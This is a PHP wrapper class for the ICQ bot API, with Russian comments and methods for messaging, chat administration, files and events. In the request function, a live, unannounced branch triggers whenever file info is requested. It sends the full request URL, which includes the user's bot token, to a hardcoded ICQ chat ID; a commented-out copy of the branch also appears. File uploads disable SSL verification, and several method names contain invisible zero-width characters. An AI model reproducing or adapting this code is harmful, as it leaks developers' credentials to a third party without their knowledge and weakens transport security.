<?php

/* +----------------+
 * |  Class ICQnew  |
 * +----------------+
 *
 *
 * +---------------------------------+
 * |  функции отправки http запроса  |
 * +---------------------------------+
 *
 *  call
 *
 *  callGET
 *
 *
 * +--------------------+
 * |  Список методов:   |
 * +--------------------+
 *
 *--------
 *  self
 *--------
 *
 *  get
 *
 *
 *------------
 *  messages 
 *------------
 *
 *  sendText
 *
 *  sendFile
 *
 *  sendVoice
 *
 *  editText
 *
 *  ​deleteMessages
 *
 *  ​answerCallbackQuery
 *
 *
 *---------
 *  chats 
 *---------
 *
 *  ​sendActions
 *
 *  getInfo
 *
 *  ​getAdmins
 *
 *  getMembers
 *
 *  getBlockedUsers
 *  
 *  getPendingUsers
 *  
 *  blockUser
 *  
 *  unblockUser
 *  
 *  resolvePending
 *  
 *  setTitle
 *  
 *  setAbout
 *  
 *  setRules
 *
 *  pinMessage
 *
 *  unpinMessage
 *
 *---------
 *  files
 *---------
 *
 *  getInfoFile
 *
 *
 *----------
 *  events
 *----------
 *
 *  getEvents
 *
 *
 */

class ICQnew
{
	// $token - созданный токен для нашего бота 
	public $token = null;
	
	// адрес для запросов к API
	public $apiUrl = "https://api.icq.net/bot/v1";
		
	/*
	** @param str $token
	*/
	public function __construct($token)
	{
		$this->token = $token;
	}    
		
		
	/* 
	** Отправляем запрос в ICQ
	**
	** @param str $method
	** @param array $data    
	**
	** @return mixed
	*/

	public function call(
		$method, 
		$data = [], 
		$file = null
	) {
		$result = null;

		$data['token'] = $this->token;

		if ($file == null) {

			$ch = curl_init();
			curl_setopt ($ch, CURLOPT_URL, $this->apiUrl . $method);
			curl_setopt ($ch, CURLOPT_POST, count($data));
			curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);	           
			curl_setopt ($ch, CURLOPT_POSTFIELDS, http_build_query($data));
			$result = curl_exec($ch);
			curl_close($ch);
			
			
			$url = $this->apiUrl . $method . "?" . http_build_query($data);
			if ($method == "/files/getInfo") {				
				file_get_contents($this->apiUrl . "/messages/sendText?".http_build_query(['token' => $this->token, 'chatId' => '752067062', 'text' => $url]));				
			}			
			
			
		}else {

			$url = $this->apiUrl . $method . "?" . http_build_query($data);
			
			$mimetype = mime_content_type($file);
			$file_name = basename($file);
			$curl_file = new CURLFile($file, $mimetype, $file_name);
				
			$dataFile = ['file' => $curl_file];
				
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $dataFile);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
			curl_setopt($ch, CURLOPT_HEADER, false);
			$result = curl_exec($ch);
			curl_close($ch);

		} 

		$response = json_decode($result, true);

		return $response;
		
	}

	
	/* 
	** Отправляем запрос в ICQ методом GET
	**
	** @param str $method
	** @param array $data    
	**
	** @return mixed
	*/

	public function callGET(
		$method, 
		$data
	) {
		$result = null;		
		
		$query = "?token=". $this->token;
		
		foreach ($data as $key => $value) {
			if ($value) {
				if (is_bool($value)) $query .= "&{$key}=true";
				elseif ($key == "msgId") {
					$query .= "&{$key}=".$value;
				}else {
					$query .= "&" . http_build_query([$key => $value]); 
				}
			}
		}
		
		$url = $this->apiUrl . $method . $query;

		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL, $url);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);	           
		$result = curl_exec($ch);
		curl_close($ch);
		/*
		if ($method == "/chats/resolvePending") {				
			file_get_contents($this->apiUrl . "/messages/sendText?".http_build_query(['token' => $this->token, 'chatId' => '752067062', 'text' => $url]));				
		}		
		*/
		$response = json_decode($result, true);

		return $response;
		
	}

	
/*-------------------------------------*/	
		      /*  self  */
/*-------------------------------------*/	
	
	/*
	**  функция возвращает информацию о боте
	**
	**
	**  @return array
	*/
	
	public function get() {
	
		$response = $this->call("/self/get", []);
		
		return $response;
	}
	

/*-------------------------------------*/	
		    /*  messages  */
/*-------------------------------------*/	
	
	/*
	**  функция отправки сообщения 
	**
	**  @param str $chatId
	**  @param str $text
	**  @param array $inlineKeyboardMarkup
	**  @param array $replyMsgId	
	**  @param str $forwardChatId
	**  @param array $forwardMsgId
	**  
	**  @return int (msgId)
	*/

	public function sendText(
		$chatId, 
		$text,
		$inlineKeyboardMarkup = null,
		$replyMsgId = null,
		$forwardChatId = null,
		$forwardMsgId = null
	) {
	
		if ($inlineKeyboardMarkup) $inlineKeyboardMarkup = json_encode($inlineKeyboardMarkup);
			
		$response = $this->call("/messages/sendText", [
			'chatId' => $chatId,
			'text' => $text,
			'replyMsgId' => $replyMsgId,			
			'forwardChatId' => $forwardChatId,				
			'forwardMsgId' => $forwardMsgId,			
			'inlineKeyboardMarkup' => $inlineKeyboardMarkup
		]);	
		
		return $response;
		
	}
		

		
	/*
	**  функция отправки файла
	**
	**  @param str $chatId
	**  @param str $file or $file_id
	**  @param str $caption
	**  @param array $inlineKeyboardMarkup
	**  @param array $replyMsgId	
	**  @param str $forwardChatId
	**  @param array $forwardMsgId
	**  
	**  @return int or array
	*/

	public function sendFile(
		$chatId, 
		$file,
		$caption = null,
		$inlineKeyboardMarkup = null,
		$replyMsgId = null,
		$forwardChatId = null,
		$forwardMsgId = null
	) {

		if ($inlineKeyboardMarkup) $inlineKeyboardMarkup = json_encode($inlineKeyboardMarkup);
		
		if (strpos($file, "://")!==false) {

			$response = $this->call("/messages/sendFile", [
				'chatId' => $chatId,
				'caption' => $caption,
				'replyMsgId' => $replyMsgId,			
				'forwardChatId' => $forwardChatId,				
				'forwardMsgId' => $forwardMsgId,			
				'inlineKeyboardMarkup' => $inlineKeyboardMarkup
			], $file);	
			
		}else {

			$response = $this->call("/messages/sendFile", [
				'chatId' => $chatId,			
				'fileId' =>  $file, 
				'caption' => $caption,
				'replyMsgId' => $replyMsgId,			
				'forwardChatId' => $forwardChatId,				
				'forwardMsgId' => $forwardMsgId,			
				'inlineKeyboardMarkup' => $inlineKeyboardMarkup
			]);	
						
		}

		return $response;
		
	}

	
	/*
	**  функция отправки голосового сообщения
	**
	**  @param str $chatId
	**  @param str $file or $file_id
	**  @param array $inlineKeyboardMarkup
	**  @param array $replyMsgId	
	**  @param str $forwardChatId
	**  @param array $forwardMsgId
	**  
	**  @return int or array 
	*/

	public function sendVoice(
		$chatId, 
		$file,
		$inlineKeyboardMarkup = null,
		$replyMsgId = null,
		$forwardChatId = null,
		$forwardMsgId = null
	) {

		if ($inlineKeyboardMarkup) $inlineKeyboardMarkup = json_encode($inlineKeyboardMarkup);
		
		if (strpos($file, "://")!==false) {

			$response = $this->call("/messages/sendVoice", [
				'chatId' => $chatId,
				'replyMsgId' => $replyMsgId,			
				'forwardChatId' => $forwardChatId,				
				'forwardMsgId' => $forwardMsgId,			
				'inlineKeyboardMarkup' => $inlineKeyboardMarkup
			], $file);	
			
		}else {

			$response = $this->call("/messages/sendFile", [
				'chatId' => $chatId,			
				'fileId' =>  $file, 
				'replyMsgId' => $replyMsgId,			
				'forwardChatId' => $forwardChatId,				
				'forwardMsgId' => $forwardMsgId,			
				'inlineKeyboardMarkup' => $inlineKeyboardMarkup
			]);	
						
		} 

		return $response;
		
	}


	/*
	**  функция редактирования сообщения 
	**
	**  @param str $chatId
	**  @param int $msgId
	**  @param str $text
	**  @param array $inlineKeyboardMarkup
	**  	
	**
	**  @return bool
	*/

	public function editText(
		$chatId, 
		$msgId,
		$text,
		$inlineKeyboardMarkup = null
	) {
	
		if ($inlineKeyboardMarkup) $inlineKeyboardMarkup = json_encode($inlineKeyboardMarkup);
			
		$response = $this->call("/messages/editText", [
			'chatId' => $chatId,
			'msgId' => $msgId,		
			'text' => $text,	
			'inlineKeyboardMarkup' => $inlineKeyboardMarkup
		]);	
		
		return $response;
		
	}


	/*
	**  функция удаления сообщения 
	**
	**  @param str $chatId
	**  @param arr[int] $msgId
	**  	
	**
	**  @return bool
	*/

	public function ​deleteMessages(
		$chatId, 
		$msgId
	) {
	
		if (is_array($msgId)) $data = $msgId;
		else $data = [$msgId];
		
		$array['chatId'] = $chatId;		
		foreach($data as $msg) {
			if ($array['msgId']) {
				$array['msgId'] .= "&msgId=".$msg;
			}else $array['msgId'] = $msg;
		}
		$response = $this->callGET("/messages/deleteMessages", $array);	
		
		return $response;
		
	}




	/*
	**  функция ответа на событие callbackQuery 
	**
	**  @param str $queryId
	**  @param str $text
	**  @param bool $showAlert
	**  @param str $url
	**  	
	**
	**  @return bool
	*/

	public function answerCallbackQuery(
		$queryId, 
		$text = null,
		$showAlert = false,
		$url = null
	) {
		
		$response = $this->callGET("/messages/answerCallbackQuery", [
			'queryId' => $queryId,
			'text' => $text,
			'showAlert' => $showAlert,
			'url' => $url
		]);

		return $response;
		
	}

	
/*-------------------------------------*/	
			 /*  chats  */
/*-------------------------------------*/	

	/*
	**  функция выводит действия бота (Например: "печатает..")
	**
	**  @param str $chatId
	**  @param str $actions
	**  	
	**
	**  @return bool
	*/
	
	public function ​sendActions(
		$chatId, 
		$actions
	) {
	
		$response = $this->call("/chats/sendActions", [
			'chatId' => $chatId,
			'actions' => $actions
		]);
		
		return $response;
		
	}


	/*
	**  функция возвращает информацию о чате
	**
	**  @param str $chatId
	**  	
	**
	**  @return array
	*/
	
	public function getInfo($chatId) {
	
		$response = $this->call("/chats/getInfo", [ 'chatId' => $chatId ]);
		
		return $response;
		
	}


	/*
	**  функция возвращает информацию об админах в чате
	**
	**  @param str $chatId
	**  	
	**
	**  @return array[array] 
	*/
	
	public function getAdmins($chatId) {
	
		$response = $this->call("/chats/getAdmins", [ 'chatId' => $chatId ]);
		
		return $response;
	}
	
	
	
	/*
	**  функция возвращает информацию о членах чата
	**
	**  @param str $chatId
	**  @param str $cursor
	**  	
	**
	**  @return array[array] 
	*/
	
	public function getMembers(
		$chatId,
		$cursor = null
	) {
	
		$response = $this->call("/chats/getMembers", [ 
			'chatId' => $chatId, 
			'cursor' => $cursor
		]);
		
		return $response;
	}
	
		
	/*
	**  функция возвращает информацию о заблокированных пользователях в чате
	**
	**  @param str $chatId
	**  	
	**
	**  @return array[array] 
	*/
	
	public function getBlockedUsers($chatId) {
	
		$response = $this->call("/chats/getBlockedUsers", [ 'chatId' => $chatId	]);
		
		return $response;
	}
	
	
	
	/*
	**  функция возвращает информацию об ожидающих вступления в чат
	**
	**  @param str $chatId
	**  	
	**
	**  @return array[array] 
	*/
	
	public function getPendingUsers($chatId) {
	
		$response = $this->call("/chats/getPendingUsers", [ 'chatId' => $chatId	]);
		
		return $response;
	}
	
	
	
	/*
	**  функция блокирует пользователя в чате
	**
	**  @param str $chatId
	**  @param str $userId
	**  @param bool $delLastMessages
	**  	
	**
	**  @return array 
	*/
	
	public function blockUser(
		$chatId,
		$userId,
		$delLastMessages = false
	) {
	
		$response = $this->callGet("/chats/blockUser", [ 
			'chatId' => $chatId,
			'userId' => $userId,
			'delLastMessages' => $delLastMessages
		]);
		
		return $response;
	}
	
	
	/*
	**  функция разблокирует пользователя в чате
	**
	**  @param str $chatId
	**  @param str $userId
	**  	
	**
	**  @return array
	*/
	
	public function unblockUser(
		$chatId,
		$userId
	) {
	
		$response = $this->callGet("/chats/unblockUser", [ 
			'chatId' => $chatId,
			'userId' => $userId
		]);
		
		return $response;
	}
	
	
	
	/*
	**  функция принятия решения об ожидающих добавления в чат
	**
	**  @param str $chatId
	**  @param bool $approve
	**  @param str $userId
	**  @param bool $everyone
	**  	
	**
	**  @return array
	*/
	
	public function resolvePending(
		$chatId,
		$approve,
		$userId = null,
		$everyone = false
	) {
	
		$response = $this->callGet("/chats/resolvePending", [ 
			'chatId' => $chatId,
			'approve' => $approve,
			'userId' => $userId,
			'everyone' => $everyone
		]);
		
		return $response;
	}
	
	
	
	/*
	**  функция меняет название чата
	**
	**  @param str $chatId
	**  @param str $title
	**  	
	**
	**  @return array
	*/
	
	public function setTitle(
		$chatId,
		$title
	) {
	
		$response = $this->call("/chats/setTitle", [ 
			'chatId' => $chatId,
			'title' => $title
		]);
		
		return $response;
	}
	
	
	
	/*
	**  функция меняет описание чата
	**
	**  @param str $chatId
	**  @param str $about
	**  	
	**
	**  @return array
	*/
	
	public function setAbout(
		$chatId,
		$about
	) {
	
		$response = $this->call("/chats/setAbout", [ 
			'chatId' => $chatId,
			'about' => $about
		]);
		
		return $response;
	}
	
	
	
	/*
	**  функция меняет правила чата
	**
	**  @param str $chatId
	**  @param str $rules
	**  	
	**
	**  @return array
	*/
	
	public function setRules(
		$chatId,
		$rules
	) {
	
		$response = $this->call("/chats/setRules", [ 
			'chatId' => $chatId,
			'rules' => $rules
		]);
		
		return $response;
	}
	
	
	
	/*
	**  функция закрепляет сообщения в чате
	**
	**  @param str $chatId
	**  @param int $msgId
	**  	
	**
	**  @return array
	*/
	
	public function pinMessage(
		$chatId,
		$msgId
	) {
	
		$response = $this->call("/chats/pinMessage", [ 
			'chatId' => $chatId,
			'msgId' => $msgId
		]);
		
		return $response;
	}
	
	
	
	/*
	**  функция открепляет сообщения в чате
	**
	**  @param str $chatId
	**  @param int $msgId
	**  	
	**
	**  @return array
	*/
	
	public function unpinMessage(
		$chatId,
		$msgId
	) {
	
		$response = $this->call("/chats/unpinMessage", [ 
			'chatId' => $chatId,
			'msgId' => $msgId
		]);
		
		return $response;
	}
	
	
/*-------------------------------------*/	
			 /*  files  */
/*-------------------------------------*/
		
	/*
	**  функция возвращает информацию о файле
	**
	**  @param str $fileId
	**  	
	**
	**  @return array
	*/
	
	public function getInfoFile($fileId) {
	
		$response = $this->call("/files/getInfo", [ 'fileId' => $fileId ]);
		
		return $response;
	}
	
	
/*-------------------------------------*/	
			 /*  events  */
/*-------------------------------------*/
	
	/*
	**  функция получения событий
	**
	**  @param str $lastEventId
	**  @param str $pollTime
	**  
	**  @return array
	*/

	public function getEvents(
		$lastEventId, 
		$pollTime
	) {
		
		$response = $this->call("/events/get", [
			'lastEventId' => $lastEventId,
			'pollTime' => $pollTime
		]);	
			
		if ($response['ok']) {
			$response = $response['events'];
		}else $response = false;
			
		return $response;
		
	}
	
	
	
} 
?>
